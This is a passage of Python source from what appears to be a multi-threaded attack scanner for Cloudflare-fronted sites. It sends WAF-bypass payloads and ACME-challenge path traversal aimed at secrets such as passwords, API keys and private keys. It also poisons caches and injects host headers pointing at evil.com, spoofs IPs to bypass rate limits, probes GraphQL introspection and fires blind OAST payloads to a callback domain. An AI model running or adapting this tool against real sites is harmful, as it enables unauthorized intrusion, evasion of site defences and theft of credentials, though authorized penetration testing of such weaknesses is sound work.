                    time.sleep(self.delay)
                    
                url = target + payload
                
                try:
                    resp = self.session.get(url, headers=headers, timeout=self.timeout,
                                           allow_redirects=False, verify=False)
                    
                    if resp.status_code in [200, 403, 500]:
                        content = resp.text.lower()
                        
                        bypass_indicators = ['root:', 'password', 'etc/passwd', 'configuration', 
                                            'admin', 'dashboard', 'login', 'unauthorized']
                        
                        if any(ind in content for ind in bypass_indicators) or resp.status_code == 200:
                            if 'access denied' not in content and 'blocked' not in content:
                                if self.verbose:
                                    print(f"  {Fore.YELLOW}[CHECK]{Style.RESET_ALL} WAF bypass possible: {payload[:50]}...")
                                
                                results['findings'].append({
                                    'type': 'WAF Bypass Payload',
                                    'url': url,
                                    'status_code': resp.status_code,
                                    'payload': payload,
                                    'interesting': True
                                })
                        
                except requests.RequestException:
                    pass
            
            # Step 8: Test Cloudflare specific paths
            print(f"  {Fore.CYAN}[*] Testing Cloudflare specific paths...{Style.RESET_ALL}")
            
            for path in CF_BYPASS_PATHS:
                if self.delay > 0:
                    time.sleep(self.delay)
                    
                url = target + path
                
                try:
                    resp = self.session.get(url, headers=headers, timeout=self.timeout,
                                           allow_redirects=False, verify=False)
                    
                    if resp.status_code == 200:
                        content = resp.text.lower()
                        
                        if 'cdn-cgi/trace' in path:
                            if 'colo=' in content or 'ip=' in content:
                                print(f"  {Fore.YELLOW}[INFO]{Style.RESET_ALL} {path} - CF Debug info exposed")
                                
                                ip_match = re.search(r'ip=([^\s\n]+)', resp.text)
                                if ip_match:
                                    print(f"    └── Client IP: {ip_match.group(1)}")
                                
                                results['findings'].append({
                                    'type': 'CF Debug Info',
                                    'url': url,
                                    'status_code': resp.status_code,
                                    'interesting': True
                                })
                        
                        elif any(x in content for x in ['email', 'security', 'contact', 'apple', 'android']):
                            if self.verbose:
                                print(f"  {Fore.BLUE}[INFO]{Style.RESET_ALL} {path} - Content found")
                        
                except requests.RequestException:
                    pass
            
            # Step 9: Test Cache Poisoning
            print(f"  {Fore.CYAN}[*] Testing cache poisoning vectors...{Style.RESET_ALL}")
            
            for payload in CF_CACHE_POISON_PAYLOADS:
                if self.delay > 0:
                    time.sleep(self.delay)
                
                test_payload = payload.replace("{random}", str(random.randint(100000, 999999)))
                url = target + test_payload
                
                poison_headers = headers.copy()
                poison_headers['X-Forwarded-Host'] = 'evil.com'
                poison_headers['X-Original-URL'] = '/admin'
                poison_headers['X-Rewrite-URL'] = '/admin'
                
                try:
                    resp = self.session.get(url, headers=poison_headers, timeout=self.timeout,
                                           allow_redirects=False, verify=False)
                    
                    cache_status = resp.headers.get('cf-cache-status', '').upper()
                    
                    if cache_status in ['HIT', 'MISS', 'DYNAMIC']:
                        if self.verbose:
                            print(f"  {Fore.BLUE}[CACHE]{Style.RESET_ALL} {test_payload[:40]} - Status: {cache_status}")
                        
                        if 'evil.com' in resp.text:
                            print(f"  {Fore.RED}[VULN]{Style.RESET_ALL} Cache poisoning possible!")
                            results['findings'].append({
                                'type': 'Cache Poisoning',
                                'url': url,
                                'status_code': resp.status_code,
                                'cache_status': cache_status,
                                'vulnerable': True
                            })
                        
                except requests.RequestException:
                    pass
            
            # Step 10: Test Host Header Injection
            print(f"  {Fore.CYAN}[*] Testing host header injection...{Style.RESET_ALL}")
            
            for host_header in HOST_HEADER_PAYLOADS:
                if self.delay > 0:
                    time.sleep(self.delay)
                
                test_headers = headers.copy()
                test_headers.update(host_header)
                
                try:
                    resp = self.session.get(target, headers=test_headers, timeout=self.timeout,
                                           allow_redirects=False, verify=False)
                    
                    content = resp.text.lower()
                    if 'evil.com' in content or 'evil.com' in str(resp.headers).lower():
                        print(f"  {Fore.RED}[VULN]{Style.RESET_ALL} Host header injection: {list(host_header.keys())[0]}")
                        
                        results['findings'].append({
                            'type': 'Host Header Injection',
                            'url': target,
                            'status_code': resp.status_code,
                            'header': list(host_header.keys())[0],
                            'vulnerable': True
                        })
                        
                except requests.RequestException:
                    pass
            
            # Step 11: Test Rate Limit Bypass
            print(f"  {Fore.CYAN}[*] Testing rate limit bypass headers...{Style.RESET_ALL}")
            
            rate_bypass_success = False
            for rate_header in RATE_LIMIT_BYPASS_HEADERS:
                if self.delay > 0:
                    time.sleep(self.delay)
                
                test_headers = headers.copy()
                for k, v in rate_header.items():
                    if '{random_ip}' in v:
                        rate_header[k] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                
                test_headers.update(rate_header)
                
                try:
                    resp = self.session.get(target, headers=test_headers, timeout=self.timeout,
                                           allow_redirects=False, verify=False)
                    
                    if resp.status_code == 200:
                        rate_bypass_success = True
                        if self.verbose:
                            print(f"  {Fore.BLUE}[INFO]{Style.RESET_ALL} Rate limit header accepted: {list(rate_header.keys())[0]}")
                        
                except requests.RequestException:
                    pass
            
            if rate_bypass_success and self.verbose:
                results['findings'].append({
                    'type': 'Rate Limit Bypass',
                    'interesting': True
                })
            
            # Step 12: Test Sensitive Paths via ACME bypass
            print(f"  {Fore.CYAN}[*] Testing sensitive paths via ACME bypass...{Style.RESET_ALL}")
            
            for path in SENSITIVE_PATHS:
                if self.delay > 0:
                    time.sleep(self.delay)
                
                acme_path = f"/.well-known/acme-challenge/{token}/..{path}"
                url = target + acme_path
                
                try:
                    resp = self.session.get(url, headers=headers, timeout=self.timeout,
                                           allow_redirects=False, verify=False)
                    
                    if resp.status_code == 200:
                        content = resp.text.lower()
                        
                        sensitive_indicators = [
                            'password', 'secret', 'api_key', 'apikey', 'token',
                            'database', 'mysql', 'postgres', 'mongodb',
                            'aws_', 'azure_', 'gcp_', 'private_key',
                            'authorization', 'credential', 'admin', 'root',
                            '[core]', 'remote "origin"', 'user ='
                        ]
                        
                        if any(ind in content for ind in sensitive_indicators):
                            print(f"  {Fore.RED}[CRITICAL]{Style.RESET_ALL} Sensitive data via ACME: {path}")
                            
                            results['findings'].append({
                                'type': 'Sensitive Path Exposure',
                                'url': url,
                                'status_code': resp.status_code,
                                'path': path,
                                'vulnerable': True,
                                'critical': True
                            })
                        elif len(resp.content) > 50:
                            if self.verbose:
                                print(f"  {Fore.YELLOW}[CHECK]{Style.RESET_ALL} Path accessible: {path}")
                        
                except requests.RequestException:
                    pass
            
            # Step 13: Test GraphQL introspection
            print(f"  {Fore.CYAN}[*] Testing GraphQL introspection...{Style.RESET_ALL}")
            
            graphql_payloads = self.generate_payloads_with_token(GRAPHQL_PAYLOADS, token)
            for payload in graphql_payloads:
                if self.delay > 0:
                    time.sleep(self.delay)
                
                url = target + payload
                
                try:
                    resp = self.session.get(url, headers=headers, timeout=self.timeout,
                                           allow_redirects=False, verify=False)
                    
                    if resp.status_code == 200:
                        content = resp.text.lower()
                        
                        if '__schema' in content or 'types' in content or 'querytype' in content:
                            print(f"  {Fore.RED}[VULN]{Style.RESET_ALL} GraphQL introspection enabled via ACME!")
                            
                            results['findings'].append({
                                'type': 'GraphQL Introspection',
                                'url': url,
                                'status_code': resp.status_code,
                                'vulnerable': True
                            })
                        
                except requests.RequestException:
                    pass
            
            # Step 14: OAST Testing
            if self.oast_client:
                print(f"  {Fore.CYAN}[*] Sending OAST payloads for blind vulnerability detection...{Style.RESET_ALL}")
                
                oast_payloads = self.oast_client.get_oast_payloads(target)
                oast_count = 0
                
                for oast_payload in oast_payloads:
                    if self.delay > 0:
                        time.sleep(self.delay)
                    
                    payload_url = oast_payload['payload'].replace("{token}", token)
                    url = target + payload_url
                    
                    try:
                        test_headers = headers.copy()
                        
                        if oast_payload.get('header_injection'):
                            test_headers['User-Agent'] = oast_payload['payload']
                            test_headers['X-Forwarded-For'] = oast_payload['payload']
                            test_headers['Referer'] = oast_payload['payload']
                            test_headers['X-Api-Version'] = oast_payload['payload']
                        
                        if oast_payload.get('content_type') == 'application/xml':
                            test_headers['Content-Type'] = 'application/xml'
                            resp = self.session.post(url, headers=test_headers, 
                                                    data=oast_payload['payload'],
                                                    timeout=self.timeout, verify=False)
                        else:
                            resp = self.session.get(url, headers=test_headers, 
                                                   timeout=self.timeout, verify=False)
                        
                        oast_count += 1
                        
                        if self.verbose:
                            print(f"    [{oast_payload['type']}] {url[:60]}...")
                            
                    except requests.RequestException:
                        pass
                
                print(f"  {Fore.GREEN}[+] Sent {oast_count} OAST payloads{Style.RESET_ALL}")
                print(f"      Callback domain: {Fore.YELLOW}{self.oast_client.callback_domain}{Style.RESET_ALL}")
                
                results['oast'] = {
                    'enabled': True,
                    'callback_domain': self.oast_client.callback_domain,
                    'payloads_sent': oast_count
                }
            
            results['status'] = 'completed'
            
        except requests.RequestException as e:
            results['status'] = 'error'
            results['error'] = str(e)
            print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {target} - {str(e)[:80]}")
        
        return results
    
    def scan_targets(self, targets):
        """Scan multiple targets with threading"""
        print(f"\n{Fore.CYAN}[*] Starting scan on {len(targets)} target(s) with {self.threads} thread(s){Style.RESET_ALL}\n")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_target = {executor.submit(self.scan_target, target): target for target in targets}
            
            for future in concurrent.futures.as_completed(future_to_target):
                result = future.result()
                self.results.append(result)
        
        return self.results
    
    def print_summary(self):
        """Print scan results summary"""
        print(f"\n{Fore.CYAN}{'='*65}")
        print(f"                       SCAN SUMMARY")
        print(f"{'='*65}{Style.RESET_ALL}\n")
        
        total_targets = len(self.results)
        cf_targets = sum(1 for r in self.results if r.get('cloudflare'))
        waf_bypass = sum(1 for r in self.results if r.get('waf_bypass'))
        total_findings = sum(len(r.get('findings', [])) for r in self.results)
        vuln_findings = sum(1 for r in self.results for f in r.get('findings', []) if f.get('vulnerable'))
        critical_findings = sum(1 for r in self.results for f in r.get('findings', []) if f.get('critical'))
        
        print(f"  Total Targets Scanned : {total_targets}")
        print(f"  Cloudflare Protected  : {cf_targets}")
        print(f"  WAF Bypass Detected   : {Fore.RED if waf_bypass > 0 else Fore.GREEN}{waf_bypass}{Style.RESET_ALL}")
        print(f"  Total Findings        : {total_findings}")
        print(f"  Vulnerable            : {Fore.RED}{vuln_findings}{Style.RESET_ALL}")
        print(f"  Critical              : {Fore.RED}{critical_findings}{Style.RESET_ALL}")
        
        if total_findings > 0:
            print(f"\n{Fore.YELLOW}[+] Detailed Findings:{Style.RESET_ALL}")
            for result in self.results:
                if result.get('findings'):
                    print(f"\n  {Fore.CYAN}Target: {result['target']}{Style.RESET_ALL}")
                    print(f"  Framework: {result.get('framework', 'unknown')}")
                    
                    if result.get('origin_ips'):
                        print(f"  {Fore.GREEN}Origin IP(s):{Style.RESET_ALL}")
                        for ip_info in result['origin_ips']:
                            verified = " ✓" if ip_info.get('verified') else ""
                            print(f"    → {Fore.RED}{ip_info['ip']}{Style.RESET_ALL}{verified} ({ip_info['source']})")
                    
                    for finding in result['findings']:
                        if finding.get('critical'):
                            status = f"{Fore.RED}CRITICAL"
                        elif finding.get('vulnerable'):
                            status = f"{Fore.RED}VULN"
                        else:
                            status = f"{Fore.YELLOW}INFO"
                        
                        print(f"    [{status}{Style.RESET_ALL}] {finding.get('type', 'Unknown')}")
                        print(f"         URL: {finding.get('url', 'N/A')}")
                        print(f"         Status: {finding.get('status_code', 'N/A')}")
                        if finding.get('header'):
                            print(f"         Header: {finding['header']}")
                        if finding.get('origin_ips'):
                            for ip_info in finding['origin_ips']:
                                verified = " (Verified)" if ip_info.get('verified') else ""
                                print(f"         {Fore.RED}Origin IP: {ip_info['ip']}{Style.RESET_ALL}{verified}")
    
    def save_results(self, filename):
        """Save results to file"""
        import json
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        print(f"\n{Fore.GREEN}[+] Results saved to: {filename}{Style.RESET_ALL}")
